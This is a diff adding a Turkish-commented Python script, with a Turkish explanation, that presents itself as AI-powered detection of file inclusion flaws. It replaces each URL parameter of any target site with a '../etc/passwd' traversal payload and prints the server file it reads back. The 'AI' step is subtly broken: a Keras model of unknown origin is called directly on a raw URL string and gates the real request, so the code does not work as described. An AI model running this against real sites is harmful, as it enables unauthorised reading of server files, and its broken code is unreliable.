@@ -1,0 +1,71 @@
+# FILE INCLUSION ZAFİYETİNİ tespit etmek için yapay zekalı bir kod
+# Bu kod, bir web sitesinin URL parametrelerinde file inclusion zafiyeti olup olmadığını kontrol eder
+# Eğer zafiyet varsa, bu kod, sunucudaki dosyaların içeriğini okuyabilir
+# Gerekli modülleri içe aktar
+import requests
+import re
+import sys
+# Hedef URL'yi komut satırından al
+target_url = sys.argv[1]
+# Yapay zeka modelini yükle
+# Bu model, bir URL'nin file inclusion zafiyeti içerip içermediğini tahmin eder
+# Model, bir sinir ağıdır ve önceden eğitilmiştir
+# Model dosyası, model.h5 adıyla aynı dizinde bulunmalıdır
+from tensorflow.keras.models import load_model
+model = load_model("model.h5")
+# Hedef URL'yi parçala
+# URL'nin şemasını, alan adını, yolu ve parametrelerini ayır
+from urllib.parse import urlparse, parse_qs
+parsed_url = urlparse(target_url)
+scheme = parsed_url.scheme
+netloc = parsed_url.netloc
+path = parsed_url.path
+params = parse_qs(parsed_url.query)
+# Parametrelerin her biri için file inclusion zafiyeti olup olmadığını kontrol et
+for param in params:
+    # Parametrenin değerini ../etc/passwd ile değiştir
+    # Bu dosya, Linux sistemlerinde kullanıcı bilgilerini içerir
+    # Eğer bu dosyanın içeriği görüntülenirse, file inclusion zafiyeti vardır
+    payload = "../etc/passwd"
+    new_params = params.copy()
+    new_params[param] = payload
+    # Yeni URL'yi oluştur
+    new_url = scheme + "://" + netloc + path + "?"
+    for key, value in new_params.items():
+        new_url += key + "=" + value[0] + "&"
+    new_url = new_url[:-1]
+    # Yeni URL'yi yapay zeka modeline ver
+    # Model, URL'nin file inclusion zafiyeti içerip içermediğini 0 ile 1 arasında bir değerle tahmin eder
+    # Eğer tahmin değeri 0.5'ten büyükse, zafiyet olduğu varsayılır
+    prediction = model.predict([new_url])[0][0]
+    if prediction > 0.5:
+        # Zafiyet olduğunu bildir
+        print(f"File inclusion zafiyeti bulundu: {new_url}")
+        # Sunucudan gelen yanıtı al
+        response = requests.get(new_url)
+        # Yanıtın içeriğini kontrol et
+        # Eğer ../etc/passwd dosyasının içeriği görüntüleniyorsa, zafiyeti doğrula
+        content = response.text
+        if re.search("root:x:0:0:root:/root:/bin/bash", content):
+            print("Zafiyet doğrulandı!")
+            print("Sunucudaki dosyaların içeriğini okuyabilirsiniz.")
+            print("Örnek olarak ../etc/passwd dosyasının içeriği:")
+            print(content)
+        else:
+            print("Zafiyet doğrulanamadı!")
+            print("Sunucu, istenen dosyanın içeriğini göstermiyor olabilir.")
+    else:
+        # Zafiyet olmadığını bildir
+        print(f"File inclusion zafiyeti bulunamadı: {new_url}")
+#Yazan Rıdvan Kaya
+ Bu kod, bir web sitesinin URL parametrelerinde file inclusion zafiyeti olup olmadığını kontrol eden yapay zekalı bir koddur. File inclusion zafiyeti, bir web uygulamasının kullanıcı girdisine göre sunucudaki dosyaları dahil etmesine izin veren bir güvenlik açığıdır. Bu açık, bir saldırganın sunucudaki hassas dosyaların içeriğini okumasına veya kod çalıştırmasına olanak sağlayabilir.
+Bu kod, şu adımları izler:
+- Gerekli modülleri içe aktarır. Bu modüller, web istekleri yapmak, URL'leri parçalamak, düzenli ifadeler kullanmak ve yapay zeka modelini yüklemek için gereklidir.
+- Hedef URL'yi komut satırından alır. Bu URL, file inclusion zafiyeti olup olmadığını kontrol etmek istediğiniz web sitesinin adresidir.
+- Yapay zeka modelini yükler. Bu model, bir URL'nin file inclusion zafiyeti içerip içermediğini tahmin eder. Model, bir sinir ağıdır ve önceden eğitilmiştir. Model dosyası, model.h5 adıyla aynı dizinde bulunmalıdır.
+- Hedef URL'yi parçalar. URL'nin şemasını, alan adını, yolu ve parametrelerini ayırır.
+- Parametrelerin her biri için file inclusion zafiyeti olup olmadığını kontrol eder. Bunun için, parametrenin değerini ../etc/passwd ile değiştirir. Bu dosya, Linux sistemlerinde kullanıcı bilgilerini içerir. Eğer bu dosyanın içeriği görüntülenirse, file inclusion zafiyeti vardır.
+- Yeni URL'yi oluşturur. Yeni URL, değiştirilen parametre değerini içerir.
+- Yeni URL'yi yapay zeka modeline verir. Model, URL'nin file inclusion zafiyeti içerip içermediğini 0 ile 1 arasında bir değerle tahmin eder. Eğer tahmin değeri 0.5'ten büyükse, zafiyet olduğu varsayılır.
+- Zafiyet olduğunu veya olmadığını bildirir. Eğer zafiyet varsa, sunucudan gelen yanıtı alır ve içeriğini kontrol eder. Eğer ../etc/passwd dosyasının içeriği görüntüleniyorsa, zafiyeti doğrular. Eğer görüntülenmiyorsa, zafiyeti doğrulayamaz. Sunucu, istenen dosyanın içeriğini göstermiyor olabilir.
+Bu kod, file inclusion zafiyeti tespit etmek için yapay zekalı bir yöntem sunar. Ancak, bu kodun bazı sınırlamaları vardır. Örneğin, bu kod sadece Linux sistemlerindeki ../etc/passwd dosyasını kullanır. Farklı işletim sistemleri veya dosyalar için çalışmayabilir. Ayrıca, bu kodun yapay zeka modeli, her zaman doğru tahminler yapmayabilir. Bu nedenle, bu kodu kullanırken dikkatli olmalısınız.
